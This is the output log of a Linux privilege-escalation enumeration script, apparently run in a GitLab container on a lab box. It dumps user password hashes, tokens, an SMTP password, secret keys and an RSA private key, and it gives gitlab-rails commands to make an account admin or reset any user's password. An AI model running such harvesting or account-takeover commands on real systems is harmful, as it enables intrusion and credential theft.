/usr/share/keyrings:
total 20
-rw-r--r-- 1 root root 12335 May 19  2012 ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root     0 May 19  2012 ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root  1227 May 19  2012 ubuntu-master-keyring.gpg
Keyring folder: /var/lib/apt/keyrings
/var/lib/apt/keyrings:
total 16
-rw-r--r-- 1 root root 12335 Nov 13  2018 ubuntu-archive-keyring.gpg

[+] Searching Filezilla sites file

[+] Searching backup-manager files

[+] Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /usr/share/lintian/overrides/passwd

[+] Searching GitLab related files
gitlab-rails was found. Trying to dump users...
{"id"=>1,
 "email"=>"admin@example.com",
 "encrypted_password"=>
  "$2a$10$zzun9kmrHMdwsJZKTmwn9OZddFjwrhbaXx3b2eb9l2g.1LrjZo0V2",
 "reset_password_token"=>nil,
 "reset_password_sent_at"=>nil,
 "remember_created_at"=>nil,
 "sign_in_count"=>0,
 "current_sign_in_at"=>nil,
 "last_sign_in_at"=>nil,
 "current_sign_in_ip"=>nil,
 "last_sign_in_ip"=>nil,
 "created_at"=>Fri, 04 Dec 2020 14:13:08 UTC +00:00,
 "updated_at"=>Fri, 04 Dec 2020 14:13:08 UTC +00:00,
 "name"=>"Administrator",
 "admin"=>true,
 "projects_limit"=>100000,
 "skype"=>"",
 "linkedin"=>"",
 "twitter"=>"",
 "bio"=>nil,
 "failed_attempts"=>0,
 "locked_at"=>nil,
 "username"=>"root",
 "can_create_group"=>true,
 "can_create_team"=>false,
 "state"=>"active",
 "color_scheme_id"=>1,
 "password_expires_at"=>nil,
 "created_by_id"=>nil,
 "last_credential_check_at"=>nil,
 "avatar"=>nil,
 "confirmation_token"=>nil,
 "confirmed_at"=>Fri, 04 Dec 2020 14:13:07 UTC +00:00,
 "confirmation_sent_at"=>nil,
 "unconfirmed_email"=>nil,
 "hide_no_ssh_key"=>false,
 "website_url"=>"",
 "notification_email"=>"admin@example.com",
 "hide_no_password"=>false,
 "password_automatically_set"=>false,
 "location"=>nil,
 "encrypted_otp_secret"=>nil,
 "encrypted_otp_secret_iv"=>nil,
 "encrypted_otp_secret_salt"=>nil,
 "otp_required_for_login"=>false,
 "otp_backup_codes"=>nil,
 "public_email"=>"",
 "dashboard"=>0,
 "project_view"=>2,
 "consumed_timestep"=>nil,
 "layout"=>0,
 "hide_project_limit"=>false,
 "unlock_token"=>nil,
 "otp_grace_period_started_at"=>nil,
 "external"=>false,
 "incoming_email_token"=>"64e48z64oohhrqhlgfkqmlgxg",
 "organization"=>nil,
 "require_two_factor_authentication_from_group"=>false,
 "two_factor_grace_period"=>48,
 "ghost"=>nil,
 "last_activity_on"=>nil,
 "notified_of_own_activity"=>false,
 "preferred_language"=>"en",
 "theme_id"=>1,
 "accepted_term_id"=>nil,
 "feed_token"=>nil,
 "private_profile"=>nil,
 "include_private_contributions"=>nil,
 "commit_email"=>nil}
{"id"=>2,
 "email"=>"slyone@slyone.com",
 "encrypted_password"=>
  "$2a$10$jTgS8vnALe1Ivo1C77j.SuWqq8e4uCt/i2GavT6ab9NN0I4hZHM4W",
 "reset_password_token"=>nil,
 "reset_password_sent_at"=>nil,
 "remember_created_at"=>nil,
 "sign_in_count"=>3,
 "current_sign_in_at"=>Sun, 30 May 2021 18:26:11 UTC +00:00,
 "last_sign_in_at"=>Sun, 30 May 2021 18:13:59 UTC +00:00,
 "current_sign_in_ip"=>"10.10.14.21",
 "last_sign_in_ip"=>"10.10.14.21",
 "created_at"=>Sun, 30 May 2021 18:13:41 UTC +00:00,
 "updated_at"=>Sun, 30 May 2021 18:26:11 UTC +00:00,
 "name"=>"Slyone",
 "admin"=>false,
 "projects_limit"=>100000,
 "skype"=>"",
 "linkedin"=>"",
 "twitter"=>"",
 "bio"=>nil,
 "failed_attempts"=>0,
 "locked_at"=>nil,
 "username"=>"slyone",
 "can_create_group"=>true,
 "can_create_team"=>false,
 "state"=>"active",
 "color_scheme_id"=>1,
 "password_expires_at"=>nil,
 "created_by_id"=>nil,
 "last_credential_check_at"=>nil,
 "avatar"=>nil,
 "confirmation_token"=>nil,
 "confirmed_at"=>Sun, 30 May 2021 18:13:41 UTC +00:00,
 "confirmation_sent_at"=>nil,
 "unconfirmed_email"=>nil,
 "hide_no_ssh_key"=>false,
 "website_url"=>"",
 "notification_email"=>"slyone@slyone.com",
 "hide_no_password"=>false,
 "password_automatically_set"=>false,
 "location"=>nil,
 "encrypted_otp_secret"=>nil,
 "encrypted_otp_secret_iv"=>nil,
 "encrypted_otp_secret_salt"=>nil,
 "otp_required_for_login"=>false,
 "otp_backup_codes"=>nil,
 "public_email"=>"",
 "dashboard"=>0,
 "project_view"=>2,
 "consumed_timestep"=>nil,
 "layout"=>0,
 "hide_project_limit"=>false,
 "unlock_token"=>nil,
 "otp_grace_period_started_at"=>nil,
 "external"=>false,
 "incoming_email_token"=>"6k9rp0cjorb0vffhu29sh3c4d",
 "organization"=>nil,
 "require_two_factor_authentication_from_group"=>false,
 "two_factor_grace_period"=>48,
 "ghost"=>nil,
 "last_activity_on"=>Sun, 30 May 2021,
 "notified_of_own_activity"=>false,
 "preferred_language"=>"en",
 "theme_id"=>1,
 "accepted_term_id"=>nil,
 "feed_token"=>"2TejAZz2nLnAK5osXyxe",
 "private_profile"=>nil,
 "include_private_contributions"=>nil,
 "commit_email"=>nil}
If you have enough privileges, you can make an account under your control administrator by running: gitlab-rails runner 'user = User.find_by(email: "youruser@example.com"); user.admin = TRUE; user.save!'
Alternatively, you could change the password of any user by running: gitlab-rails runner 'user = User.find_by(email: "admin@example.com"); user.password = "pass_peass_pass"; user.password_confirmation = "pass_peass_pass"; user.save!'

Found /etc/gitlab/gitlab.rb

Found /opt/backup/gitlab.rb
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"

Found /opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml
  repositories:
    # Paths where repositories can be stored. Give the canonicalized absolute pathname.
    # NOTE: REPOS PATHS MUST NOT CONTAIN ANY SYMLINK!!!
    storages: {"default":{"path":"/var/opt/gitlab/git-data/repositories","gitaly_address":"unix:/var/opt/gitlab/gitaly/gitaly.socket"}}

--
  repositories:
    storages:
      default: { "path": "tmp/tests/repositories/" }
  gitlab_shell:
    path: tmp/tests/gitlab-shell/

Found /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
---
production:
  db_key_base: eaa32eb7018961f9b101a330b8a905b771973ece8667634e289a0383c2ecff650bb4e7b1a6034c066af2f37ea3ee103227655c33bc17c123c99f421ee0776429
  secret_key_base: b7c70c02d37e37b14572f5387919b00206d2916098e3c54147f9c762d6bef2788a82643d0c32ab1cdb315753d6a4e59271cddf9b41f37c814dd7d256b7a2f353
  otp_key_base: b30e7b1e7e65c31d70385c47bc5bf48cbe774e39492280df7428ce6f66bc53ec494d2fbcbf9b49ec204b3ba741261b43cdaf7a191932f13df1f5bd6018458e56
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    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
    -----END RSA PRIVATE KEY-----

Found /var/opt/gitlab/gitlab-rails/etc/gitlab.yml
  repositories:
    # Paths where repositories can be stored. Give the canonicalized absolute pathname.
    # NOTE: REPOS PATHS MUST NOT CONTAIN ANY SYMLINK!!!
    storages: {"default":{"path":"/var/opt/gitlab/git-data/repositories","gitaly_address":"unix:/var/opt/gitlab/gitaly/gitaly.socket"}}

--
  repositories:
    storages:
      default: { "path": "tmp/tests/repositories/" }
  gitlab_shell:
    path: tmp/tests/gitlab-shell/

Found /var/opt/gitlab/gitlab-rails/etc/secrets.yml
---
production:
  db_key_base: eaa32eb7018961f9b101a330b8a905b771973ece8667634e289a0383c2ecff650bb4e7b1a6034c066af2f37ea3ee103227655c33bc17c123c99f421ee0776429
  secret_key_base: b7c70c02d37e37b14572f5387919b00206d2916098e3c54147f9c762d6bef2788a82643d0c32ab1cdb315753d6a4e59271cddf9b41f37c814dd7d256b7a2f353
  otp_key_base: b30e7b1e7e65c31d70385c47bc5bf48cbe774e39492280df7428ce6f66bc53ec494d2fbcbf9b49ec204b3ba741261b43cdaf7a191932f13df1f5bd6018458e56
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    MIIJKAIBAAKCAgEA2l/m01GZYRj9Iv5A49uAULFBomOnHxHnQ5ZvpUPRj1fMovoC
    dQBdEPdcB+KmsHKbtv21Ycfe8fK2RQpTZPq75AjQ37x63S/lpVEnF7kxcAAf0mRw
    BEtKoBs3nodnosLdyD0+gWl5OHO8MSghGLj/IrAuZzYPXQ7mlEgZXVPezJvYyUZ3
    fnMSPdC5ubwXHM/e5/tcuPoEpqLIPjeAmfWzqNh8Tm50u+HL3/DjY280brEVU5l0
    ZMle+2XB5W9lXXNbE3042vXw6B9FICkSuuyvw95mAv9ZF/p3lR4w1WSMoSanzIjy
    zyXXUnaExUO0gxsTJild4dbMQEn+UFa/juqtkY0i++Bkq/Chau8PkXX8ShoeJ3nt
    4zqyCMLCXjeyelvJv2HOUpwAB+/qE347gaumSiF9UqXUp4D3eVol2UvbztyV/qsd
    JOGovfmqEb4qDDS5NUQyZPPoY4lQ59rz0d9kpCbI2lLiPU4ib5EGcD2wYsg7I+Q/
    G9GdQHLbNj1U6eGou4J3VZaUTVXOzWFg+P2o20091fJPiOvYJDvxa45gjPo7zuPG
    cQEJh/D6DXkkijgipEwrCmMHdlrzpTxFXSPJHd+/DuaQyz+kZpgqs32HSEU5xEZ5
    YzrjTOE8t6Zs+rVXIRfuaJVEMqUSOtxx6QCsbuf1jpjw1B3VKSkvr2+rLxMCAwEA
    AQKCAgBPzM3gGSiQl/4hJIJ4AcWBN1VBz2LJ8tPtGfNQlFjnJfGM+Qme0fQweAQ0
    iXnabvdCRrJauhxZlBVRY3WYKBwzN5mEuS6414D3CZHclHthb1oxmyxoFU9+9JM9
    pkOT8dv0CZVm2zFGFN0HpZ96llf9yB4c719r5T8TnslOFpELekQdQVf3aHuZBUZp
    fjd/+uJ9KZj3q725WzELs2KWYHg30mySiMC1y8yh2DhwJLonXSTq+N/U2NWRztyt
    SCjlnnsAwzjcoxVW7d5n4zqJ/mY4kHP80m0vWwMKBg9YW7ccSLD3CHCajDyEUPUx
    1Q0JAALeZi19ku3u7Fs35ot34YBtTCXDXSCXDrCGSfgXJtptCW4h7/nnwKiqKFCc
    hRKHdqz7fvd2aePj2vjEftdxNGZi3BAn0kE4IOlTVpvj5NN+bMi2WztIY4/RSagA
    F8oQkzscx2YM295pd8q8U7ZJa5rFEdeWHqd49LXSw85Ss/wva2FCsxgqtVI7FVme
    /Ou9xVmJ7+pXeVg/xkQ+Awx01AsRQ0wI2rZt+q8bWMKj3oJ0eTmakiwo4yNJ05F9
    TybDSLxR0Zf6NJgkxbbotQvX/1+JyoEzyYCRzERbPbWCfAhC9Nt1i8QJYTgxm2x6
    7YtVWApkaG7aeYGwVa+5dlzhfROqdi91lWtpG/p580U7IaB+YQKCAQEA8rHSit4Z
    K1W7OntYKijaOTckJkw0E5PCFkFd4MoadBB7NpXlacRODTkb5D1UjXGghG3UeRUQ
    M3Vt1s86vGhzXBsyrwy9YyXufiN7ltmgV1fr5vKpJN8BPhwx6T8BvbqsxeUxQFLi
    nwEMx20TS1h/Rf09q4CPQUAEYXYzwHN2F3znqEV6iKpmTLHsSnxdA5fYUsZ62+zM
    1/0+TJAqcqvgq/bDUBEppGCBIux38si3Y8/ns30X4pi3VYyZQ0VHe0D32FvL8iFG
    Iwdk2IQY2NrRo/hFG0j+NzAga+FzzSsktvh++QvVIzWalYyP+rp0i7itsP251gvz
    TX3YBKRYUFqdQwKCAQEA5ljAjBhwS2CFKsR2tRFBQMNRNVbs8SzZAEH3wmDT2ces
    efK6S4KsnFvzFYfdnK/VYbk90gF8qdaH+xxFd6bjZJxp1de7tPBpCoZzRANxdnzE
    1PNSu6SqPef4aqkpARHp0VsgGKAOIq9bb+oKhH1fPjURq5IzcPsXUoR3B0Hy2nrZ
    4FPVQ5lFbZJJ154Xvmu6qSuZOj7ajUDin28kz9Q9Lq6HvI4cusHLVKk7xRrGJX3t
    M7L2dhpZfrAKQIyV2pAnNEiAvhu+e8ICDtRn8A7Tw+VL6STRAaxovWxiuuLGxJir
    /SLJvmYZVYFATsFdlP9N4LzZfMAZ3p2nYyvj+lKh8QKCAQA6LjT6A3pnMBs9Ttp4
    6Og/tR9eawBE/TQXH76AqBKlZloTYOXpcB0CAIHWOnmtmuLPPIEmMc17eJhHWdCL
    4EJff0msO1KflTVSWfFD3ZIZvkMYT24LH8bte9bfQrKJKFpI6sPe1r/rPFYy7Mwm
    UOXaAnapSZ2OF+m076BCb6uMv+3NIjLY1njFxBWQWbX2qY07csd7N4537QblVd5H
    NTscHoD+Dc88z8HFfIjY1BNawzmZhtCWCuRQhu8q+E3Fl3KTFJaUyjNFLH2Zhjlq
    qzJ8q4TtoJcI5emv0xFuyvv3PSU7UQHcefpABb1ybwaHhFNnTbwiOyUtm5CQtFFT
    mhV/AoIBAQCLNJu4jpRemUghHnX22ySqNN+A8rVi0w2ZYESQzd95v3f2gsAfHiue
    mtr+6gr9xC2aT06S+Z8TLLklAmLg+pR1mylCuIuRv7BbUgGa2tHZH3H8l8gp6kuP
    +f5gxzYmlWLOyNlOyHuCbqM9sR0GEJZci8nP/BzmbHgdwDwGwM45RwEg1skNfzU8
    EKpbigkjZQt7bQO+9Xky4EGUxKBkkQkgiw0w4Flwa+mrklKyvYl94upU0hSsLyRi
    sZSgidWOLovixuY2/aFSPV7tA2SE6REFVC9aCIvfDQiHYVcRRjeFXBakdj+htyYc
    TG5GqgkaIGg6Jybwg0+e/3vHLSEriIChAoIBADFghdUMhx5PCtu2tBKxdyhlGkJI
    Wr2U0K43gbUcsWDpoX3OoWhdzlPbTPRDIxrouA8KNAq0IWCI1OuPwatu8WxojDgD
    NLyoq74q0LmwVgLh0Nf0XpQyeSokvq8wEiguA/H8Mu+7Zuh0vUDGyRmuUdMQIDN+
    YaBfeaKyBq2xmJU67WKWn5fwNsgR4PRbvUz1uQEzc+6P4t8nDdiUDKEZdwXQy0Wf
    bhLhSXYB76eBER3LjTENMyDo0XD3NIvh25Ev8bcdeIA+eqDn8xTmGEX6GKEXgaRF
    BEtSwHoJcwgtd1RzOwyqB1lhDpWYoQK9KNJbVac1egscDh6MYD1oJSCay0E=
    -----END RSA PRIVATE KEY-----


[+] Searching PGP/GPG
PGP/GPG software:
/opt/gitlab/embedded/bin/gpg
netpgpkeys Not Found
netpgp Not Found

[+] Searching vim files

[+] Checking if containerd(ctr) is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation

[+] Checking if runc is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation

[+] Searching docker files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket
-rw-r--r-- 1 root root 872 Dec  7 09:25 /opt/backup/docker-compose.yml
-rw-r--r-- 1 root root 412 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/flipper-0.13.0/Dockerfile
-rw-r--r-- 1 root root 674 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/flipper-0.13.0/docker-compose.yml
-rw-r--r-- 1 root root 418 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/ci/docker-image/Dockerfile
-rw-r--r-- 1 root root 802 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/sidekiq-cron-0.6.0/Dockerfile
-rw-r--r-- 1 root root 430 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/sidekiq-cron-0.6.0/docker-compose.yml
-rw-r--r-- 1 root root 38 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/docker-compose.yml
total 76
-rw-r--r-- 1 root root  410 Nov 20  2018 Binary-alpine.Dockerfile
-rw-r--r-- 1 root root  649 Nov 20  2018 Binary-scratch.Dockerfile
-rw-r--r-- 1 root root  332 Nov 20  2018 Binary.Dockerfile
-rw-r--r-- 1 root root 2377 Nov 20  2018 CONTRIBUTING.md
-rw-r--r-- 1 root root  290 Nov 20  2018 Golang-alpine.Dockerfile
-rw-r--r-- 1 root root  502 Nov 20  2018 Golang-scratch.Dockerfile
-rw-r--r-- 1 root root  205 Nov 20  2018 Golang.Dockerfile
-rw-r--r-- 1 root root   54 Nov 20  2018 HTTPd.Dockerfile
-rw-r--r-- 1 root root 1278 Nov 20  2018 LICENSE
-rw-r--r-- 1 root root  341 Nov 20  2018 Node-alpine.Dockerfile
-rw-r--r-- 1 root root  231 Nov 20  2018 Node.Dockerfile
-rw-r--r-- 1 root root  111 Nov 20  2018 OpenJDK-alpine.Dockerfile
-rw-r--r-- 1 root root  319 Nov 20  2018 OpenJDK.Dockerfile
-rw-r--r-- 1 root root  480 Nov 20  2018 PHP.Dockerfile
-rw-r--r-- 1 root root  443 Nov 20  2018 Python-alpine.Dockerfile
-rw-r--r-- 1 root root  531 Nov 20  2018 Python.Dockerfile
-rw-r--r-- 1 root root  199 Nov 20  2018 Python2.Dockerfile
-rw-r--r-- 1 root root  687 Nov 20  2018 Ruby-alpine.Dockerfile
-rw-r--r-- 1 root root  643 Nov 20  2018 Ruby.Dockerfile

[+] Interesting Firefox Files
[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox

[+] Interesting Chrome Files
[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox

[+] Autologin Files

[+] S/Key authentication

[+] YubiKey authentication

[+] Passwords inside pam.d

[+] FastCGI Params
-rw-r--r-- 1 root root 1007 Nov 20  2018 /opt/gitlab/embedded/conf/fastcgi_params


[+] SNMPs



════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-x 1 root root  40K May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root  53K May 16  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root  74K May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root  49K May 16  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root  39K May 16  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root  40K May 16  2017 /bin/su
-rwsr-xr-x 1 root root  27K May 16  2018 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root  40K May 16  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 419K Nov  5  2018 /usr/lib/openssh/ssh-keysign

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow  23K May 16  2017 /usr/bin/expiry
-rwxr-sr-x 1 root shadow  61K May 16  2017 /usr/bin/chage
-rwxr-sr-x 1 root shadow  35K Apr  9  2018 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow  35K Apr  9  2018 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root tty     27K May 16  2018 /usr/bin/wall
-rwxr-sr-x 1 root ssh    351K Nov  5  2018 /usr/bin/ssh-agent

[+] Checking misconfigurations of ld.so
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
Current capabilities:
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+i
CapInh:	0000003fffffffff
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh:	0000003fffffffff
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Files with capabilities (limited to 50):

[+] Users with capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/etc/security/capability.conf Not Found

[+] Files with ACLs (limited to 50)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
files with acls in searched folders Not Found

[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
/opt/gitlab/embedded/bin/jemalloc.sh

[+] Unexpected in root
/root_pass
/.dockerenv
/assets
/RELEASE

[+] Files (scripts) in /etc/profile.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
total 12
drwxr-xr-x 2 root root 4096 Apr 12  2016 .
drwxr-xr-x 1 root root 4096 Dec  2 10:45 ..

[+] Permissions in init, init.d, systemd, and rc.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d

[+] Hashes inside passwd file? ........... No
[+] Writable passwd file? ................ No
[+] Credentials in fstab/mtab? ........... No
[+] Can I read shadow files? ............. No
[+] Can I read opasswd file? ............. No
[+] Can I write in network-scripts? ...... No
[+] Can I read root folder? .............. No

[+] Searching root files in home dirs (limit 30)
/home/
/home/dude/.bash_history
/root/
/var/opt/gitlab
/var/opt/gitlab/nginx
/var/opt/gitlab/gitaly/config.toml
/var/opt/gitlab/gitaly/VERSION
/var/opt/gitlab/trusted-certs-directory-hash
/var/opt/gitlab/gitlab-shell/config.yml
/var/opt/gitlab/public_attributes.json
/var/opt/gitlab/bootstrapped
/var/opt/gitlab/gitlab-workhorse/config.toml
/var/opt/gitlab/gitlab-workhorse/VERSION
/var/opt/gitlab/node-exporter
/var/opt/gitlab/gitlab-rails/REVISION
/var/opt/gitlab/gitlab-rails/RUBY_VERSION
/var/opt/gitlab/gitlab-rails/VERSION
/var/opt/gitlab/gitlab-rails/upgrade-status/db-migrate-873248b1f0d3a7a5535771a3a1635803-98f8423
/var/opt/gitlab/gitlab-rails/etc/gitlab_shell_secret
/var/opt/gitlab/gitlab-rails/etc/gitlab_workhorse_secret
/var/opt/gitlab/gitlab-rails/etc/secrets.yml
/var/opt/gitlab/gitlab-rails/etc/rack_attack.rb
/var/opt/gitlab/gitlab-rails/etc/gitlab.yml
/var/opt/gitlab/gitlab-rails/etc/resque.yml
/var/opt/gitlab/gitlab-rails/etc/database.yml
/var/opt/gitlab/gitlab-rails/etc/unicorn.rb
/var/opt/gitlab/logrotate

[+] Searching folders owned by me containing others files on it

[+] Readable files belonging to root and readable by me but not world readable
